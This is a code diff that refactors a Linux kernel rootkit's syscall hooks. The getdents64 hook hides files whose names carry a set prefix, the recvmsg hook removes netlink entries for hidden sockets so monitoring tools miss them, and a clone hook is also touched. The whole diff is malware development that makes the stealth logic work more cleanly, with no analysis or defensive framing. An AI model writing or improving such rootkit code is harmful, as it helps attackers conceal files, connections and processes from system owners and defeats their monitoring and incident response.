@@ -30,8 +30,8 @@ asmlinkage long rk_getdents64(const struct pt_regs *pt_regs)
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)pt_regs->si;
 
     int ret = orig_getdents64(pt_regs), err;
-    unsigned long off = 0;
-    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+    unsigned long offset = 0;
+    struct linux_dirent64 *dir, *kdirent = NULL;
 
     if (!module_hidden)
         return ret;
@@ -53,25 +53,17 @@ asmlinkage long rk_getdents64(const struct pt_regs *pt_regs)
         return ret;
     }
 
-    while (off < ret)
+    while (offset < ret)
     {
-        dir = (void *)kdirent + off;
+        dir = (void *)kdirent + offset;
 
         if (memcmp(dir->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
         {
-            if (dir == kdirent)
-            {
-                ret -= dir->d_reclen;
-                memmove(dir, (void *)dir + dir->d_reclen, ret);
-                continue;
-            }
-
-            prev->d_reclen += dir->d_reclen;
+            int reclen = dir->d_reclen;
+            ret -= reclen;
+            memmove(dir, (void *)dir + reclen, ret - offset);
         }
-        else
-            prev = dir;
-
-        off += dir->d_reclen;
+        else offset += dir->d_reclen;
     }
 
     copy_to_user(dirent, kdirent, ret);
@@ -96,10 +88,6 @@ asmlinkage long rk_recvmsg(const struct pt_regs *pt_regs)
     long ret;
     struct nlmsghdr *nlh;
     long count;
-    int found;
-    char *stream;
-    int offset;
-    int i;
 
     ret = orig_recvmsg(pt_regs);
 
@@ -116,29 +104,16 @@ asmlinkage long rk_recvmsg(const struct pt_regs *pt_regs)
 
     count = ret;
 
-    found = 1;
-
     while (NLMSG_OK(nlh, count))
     {
-        if (found == 0)
-            nlh = NLMSG_NEXT(nlh, count);
-
-        if (!hidden_socket(nlh))
+        if (hidden_socket(nlh))
         {
-            found = 0;
-            continue;
+            int offset = NLMSG_ALIGN((nlh)->nlmsg_len);
+            memmove(nlh, (void *)nlh + offset, count);
+
+            ret -= offset;
         }
-
-        found = 1;
-
-        stream = (char *)nlh;
-
-        offset = NLMSG_ALIGN((nlh)->nlmsg_len);
-
-        for (i = 0; i < count; i++)
-            stream[i] = stream[i + offset];
-
-        ret -= offset;
+        else nlh = NLMSG_NEXT(nlh, count);
     }
 
     return ret;
@@ -146,7 +121,6 @@ asmlinkage long rk_recvmsg(const struct pt_regs *pt_regs)
 
 /* Process management */
 
-// asmlinkage long(*)(unsigned long, unsigned long, int __user *, unsigned long, int __user *)
 asmlinkage long rk_clone(const struct pt_regs *pt_regs)
 {
     long i = orig_clone(pt_regs);
